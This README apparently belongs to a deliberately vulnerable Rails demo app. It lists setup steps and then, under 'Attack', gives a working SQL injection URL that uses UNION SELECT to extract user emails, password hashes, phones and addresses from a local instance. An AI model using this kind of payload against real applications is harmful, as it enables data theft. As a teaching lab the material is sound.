# How to use this application


## Setup

This is a regular Rails application, setup it as you would do with any other
application.

If you don't have bundler, install it:

    $ sudo gem install bundler

Once bundler is installed:

    $ bundle
    $ rake db:setup

### Run 

    $ rails s

### Attack

https://localhost:3000/characters/1%20UNION%20SELECT%201,email,encrypted_password,4,5,6,7,8,9,10,phone,address,1%20FROM%20users%20LIMIT%201,1
